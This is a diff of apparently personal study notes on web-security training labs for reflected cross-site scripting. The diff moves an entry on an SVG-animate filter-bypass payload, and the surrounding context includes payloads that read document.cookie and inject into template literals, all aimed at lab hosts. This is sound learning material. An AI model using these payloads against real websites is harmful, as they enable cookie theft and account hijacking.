@@ -25,6 +25,12 @@
 		location = 'https://0a7100f703afb15f809d1c51002f004b.web-security-academy.net/?							search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
 		</script>
 
+------> Lab: Reflected XSS with event handlers and href attributes blocked
+	Flow: forgot to escape svg, animate and a tags
+	Method: craft a payload using <svg>, <animate> and <a> tags in such a way that the <animate> tag assigns
+		attribute and attribute value to <a> tag. The attribute and its value should trigger the xss.
+		Payload: <svg><a><animate attributeName='href' values='javascript:alert(0)'/><text y='25' x='25'>Click me</text></a></svg>
+
 ------> Lab: Reflected XSS with some SVG markup allowed
 	Flow: forgot to disallow SVG markup
 	method: brute-force the tags to see all allowed tags.
@@ -60,11 +66,7 @@
 	Method: add executable js code in the template literal
 	Payload: BSH${alert(0)}
 
-------> Lab: Reflected XSS with event handlers and href attributes blocked
-	Flow: forgot to escape svg, animate and a tags
-	Method: craft a payload using <svg>, <animate> and <a> tags in such a way that the <animate> tag assigns
-		attribute and attribute value to <a> tag. The attribute and its value should trigger the xss.
-		Payload: <svg><a><animate attributeName='href' values='javascript:alert(0)'/><text y='25' x='25'>Click me</text></a></svg>
+
 
 
 
